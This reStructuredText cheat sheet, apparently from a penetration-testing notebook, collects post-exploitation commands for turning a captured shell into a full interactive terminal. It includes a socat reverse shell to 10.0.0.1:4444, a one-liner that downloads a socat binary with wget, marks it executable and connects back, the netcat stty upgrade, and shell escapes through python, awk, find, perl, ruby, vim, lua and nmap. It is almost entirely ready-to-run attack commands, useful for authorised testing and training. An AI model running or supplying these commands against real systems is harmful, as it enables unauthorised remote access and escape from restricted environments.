===========
Gaining TTY
===========

Check to see if we have a TTY:

.. code-block:: bash

    if [ -t 1 ] ; then echo terminal; else echo "not a terminal"; fi

Python
------

.. code-block:: none

    python -c 'import pty; pty.spawn("/bin/sh")'
    python -c 'import pty; pty.spawn("/bin/bash")'

socat
-----

Run listener on local machine:

.. code-block:: none

    socat file:`tty`,raw,echo=0 tcp-listen:4444

Run on remote machine:

.. code-block:: none

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444

If socat isn't installed, you can try and download a static binary and run that:

.. code-block:: none

    wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444

netcat "magic"
--------------

.. code-block:: bash

    # In reverse shell
    python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl-Z

    # In Kali
    echo $TERM # note this value
    stty -a # note values
    stty raw -echo; fg

    # In reverse shell
    reset
    export SHELL=bash
    export TERM=xterm-256color # value from before
    stty rows <num> columns <cols> # values from before

sh
--

.. code-block:: none

    /bin/sh -i

awk
---

.. code-block:: none

    awk 'BEGIN {system("/bin/bash")}'

find
----

.. code-block:: none

    find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;

Perl
----

.. code-block:: none

    perl -e 'exec "/bin/sh";'

    OR

    perl: exec "/bin/sh";

Ruby
----

.. code-block:: none

    ruby: exec "/bin/sh"

vi / vim
--------

.. code-block:: none

    vi --not-a-term -c '!sh'

.. code-block:: none

    vim --not-a-term --cmd '!sh' --cmd ':q!'

If --cmd is not enabled, first create a file with the following contents:

.. code-block:: none

    :set shell=/bin/bash
    :shell

Now execute the following:

.. code-block:: none

    vi -s <file>

    OR

    vim -s <file>

Lua
---

.. code-block:: none

    lua: os.execute('/bin/sh')

From within IRB
---------------

.. code-block:: none

    exec "/bin/sh"

From within vi / vim
--------------------

.. code-block:: none

    :!bash

    OR

    :set shell=/bin/bash:shell

From within nmap
----------------

.. code-block:: none

    !sh

echo
----

Note: This may be limited to LShell, a limited shell implemented in Python.

.. code-block:: none

    echo os.system('/bin/bash')

Resources
---------

https://netsec.ws/?p=337
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
